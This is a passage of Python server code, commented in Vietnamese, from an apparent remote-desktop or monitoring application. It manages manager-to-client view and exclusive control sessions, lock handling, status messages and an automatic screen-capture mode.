                        self.manager_sessions[manager_id]["view"].append(client_id)
        
        # Gửi message BÊN NGOÀI lock để tránh deadlock
        # Check lại kết quả sau khi release lock
        if client_id not in self.clients:
            self._send_control_pdu(manager_id, f"{CMD_ERROR}:Client không tồn tại")
            return False
        
        view_session = self.view_sessions.get(client_id)
        if not view_session or not view_session.is_viewing(manager_id):
            self._send_control_pdu(manager_id, f"{CMD_ERROR}:Đã đang view client này")
            return False
        
        # Thông báo thành công
        print(f"[ViewSession] 📤 Sending CMD_VIEW_STARTED to manager {manager_id}")
        try:
            self._send_control_pdu(manager_id, f"{CMD_VIEW_STARTED}:{client_id}")
            print(f"[ViewSession] ✅ Sent to manager successfully")
        except BaseException as e:
            print(f"[ViewSession] ❌ Failed to send to manager: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            return False
        
        print(f"[ViewSession] 📤 Sending CMD_VIEW_STARTED to client {client_id}")
        try:
            self._send_control_pdu(client_id, f"{CMD_VIEW_STARTED}:{manager_id}")
            print(f"[ViewSession] ✅ Sent to client successfully")
        except Exception as e:
            print(f"[ViewSession] ❌ Failed to send to client: {e}")
            return False
        
        print(f"[ViewSession] ✅ Manager {manager_id} started viewing {client_id}")
        return True
    
    def _stop_view_session(self, manager_id):
        """
        Dừng tất cả VIEW sessions của manager
        """
        # Lấy thông tin và update state TRONG lock
        clients_to_notify = []
        with self.lock:
            if manager_id not in self.manager_sessions:
                return
            
            viewing_clients = self.manager_sessions[manager_id]["view"].copy()
            
            for client_id in viewing_clients:
                if client_id in self.view_sessions:
                    view_session = self.view_sessions[client_id]
                    is_empty = view_session.remove_viewer(manager_id)
                    
                    # Nếu không còn viewer nào, xóa ViewSession
                    if is_empty:
                        del self.view_sessions[client_id]
                        print(f"[ViewSession] Deleted ViewSession for {client_id} (no viewers)")
                    
                    # Lưu lại để gửi message BÊN NGOÀI lock
                    clients_to_notify.append(client_id)
            
            # Clear danh sách view của manager
            self.manager_sessions[manager_id]["view"] = []
        
        # Gửi message BÊN NGOÀI lock để tránh deadlock
        for client_id in clients_to_notify:
            print(f"[ViewSession] 📤 Sending view_stopped to manager {manager_id}")
            self._send_control_pdu(manager_id, f"{CMD_VIEW_STOPPED}:{client_id}")
            print(f"[ViewSession] 📤 Sending view_stopped to client {client_id}")
            self._send_control_pdu(client_id, f"{CMD_VIEW_STOPPED}:{manager_id}")
    
    def _start_control_session(self, manager_id, client_id):
        """
        Bắt đầu CONTROL session: Manager điều khiển Client (1-1 exclusive)
        Chỉ 1 manager có thể control 1 client tại 1 thời điểm
        """
        # Kiểm tra và validate TRONG lock
        error_msg = None
        with self.lock:
            # Kiểm tra client có tồn tại không
            if client_id not in self.clients:
                error_msg = f"{CMD_ERROR}:Client không tồn tại"
            # Kiểm tra client đã bị control bởi người khác chưa
            elif client_id in self.control_sessions:
                existing_controller = self.control_sessions[client_id].manager_id
                error_msg = f"{CMD_CONTROL_DENIED}:Client đang bị điều khiển bởi {existing_controller}"
            # Kiểm tra manager đã đang control client khác chưa
            elif manager_id in self.manager_sessions and self.manager_sessions[manager_id]["control"]:
                error_msg = f"{CMD_ERROR}:Bạn đang điều khiển client khác"
        
        # Gửi error message BÊN NGOÀI lock
        if error_msg:
            self._send_control_pdu(manager_id, error_msg)
            return False
        
        # Tạo ControlSession (1-1 exclusive)
        print(f"[ControlSession] Starting: Manager({manager_id}) <-> Client({client_id})")
        control_session = ControlSession(manager_id, client_id, self.broadcaster, self._on_control_session_done)
        control_session.start()
        
        with self.lock:
            self.control_sessions[client_id] = control_session
            
            # Cập nhật manager_sessions
            if manager_id not in self.manager_sessions:
                self.manager_sessions[manager_id] = {"view": [], "control": None}
            self.manager_sessions[manager_id]["control"] = client_id
        
        # Thông báo thành công BÊN NGOÀI lock
        self._send_control_pdu(manager_id, f"{CMD_CONTROL_STARTED}:{client_id}")
        self._send_control_pdu(client_id, f"{CMD_CONTROL_STARTED}:{manager_id}")
        
        # Cập nhật danh sách client (client đang bị control)
        self._broadcast_client_list()
        return True
    
    def _stop_control_session(self, manager_id):
        """
        Dừng CONTROL session của manager
        """
        # Lấy thông tin và cleanup TRONG lock
        client_id = None
        control_session = None
        with self.lock:
            if manager_id not in self.manager_sessions:
                return
            
            client_id = self.manager_sessions[manager_id]["control"]
            if not client_id:
                return
            
            # Lấy control session
            if client_id in self.control_sessions:
                control_session = self.control_sessions[client_id]
                del self.control_sessions[client_id]
                print(f"[ControlSession] Stopping: Manager({manager_id}) <-> Client({client_id})")
            
            # Clear manager control
            self.manager_sessions[manager_id]["control"] = None
        
        # Dừng session và gửi message BÊN NGOÀI lock
        if control_session:
            control_session.stop()
        
        if client_id:
            print(f"[ControlSession] 📤 Sending control_stopped to manager {manager_id}")
            self._send_control_pdu(manager_id, f"{CMD_CONTROL_STOPPED}:{client_id}")
            print(f"[ControlSession] 📤 Sending control_stopped to client {client_id}")
            self._send_control_pdu(client_id, f"{CMD_CONTROL_STOPPED}:{manager_id}")
        
        # Cập nhật danh sách client (client không còn bị control)
        self._broadcast_client_list()
    
    def _on_control_session_done(self, control_session, reason):
        """
        Callback khi ControlSession kết thúc
        """
        print(f"[ControlSession] Ended: {control_session.session_id}. Reason: {reason}")
        
        with self.lock:
            # Xóa control session
            if control_session.client_id in self.control_sessions:
                del self.control_sessions[control_session.client_id]
            
            # Cập nhật manager_sessions
            if control_session.manager_id in self.manager_sessions:
                self.manager_sessions[control_session.manager_id]["control"] = None
        
        # Thông báo
        self._send_control_pdu(control_session.manager_id, f"{CMD_CONTROL_STOPPED}:{control_session.client_id}")
        self._send_control_pdu(control_session.client_id, f"{CMD_CONTROL_STOPPED}:{control_session.manager_id}")
        
        # Cập nhật danh sách client
        self._broadcast_client_list()
    
    def _auto_enable_screen_capture(self, client_id):
        """
        Tự động bật screen capture cho client (không cần manager)
        Tạo một VIEW session ảo để client bắt đầu gửi frames
        """
        try:
            with self.lock:
                # Tạo ViewSession cho client này
                if client_id not in self.view_sessions:
                    self.view_sessions[client_id] = ViewSession(client_id, self.broadcaster)
                    print(f"[ScreenshotStorage] Created ViewSession for auto-capture: {client_id}")
            
            # Gửi lệnh bắt đầu VIEW cho client (không cần manager_id)
            self._send_control_pdu(client_id, f"{CMD_VIEW_STARTED}:auto-capture")
            print(f"[ScreenshotStorage] Sent VIEW_STARTED to client {client_id} for auto-capture")
            
        except Exception as e:
            print(f"[ScreenshotStorage] ERROR auto-enabling screen capture: {e}")
            import traceback
            traceback.print_exc()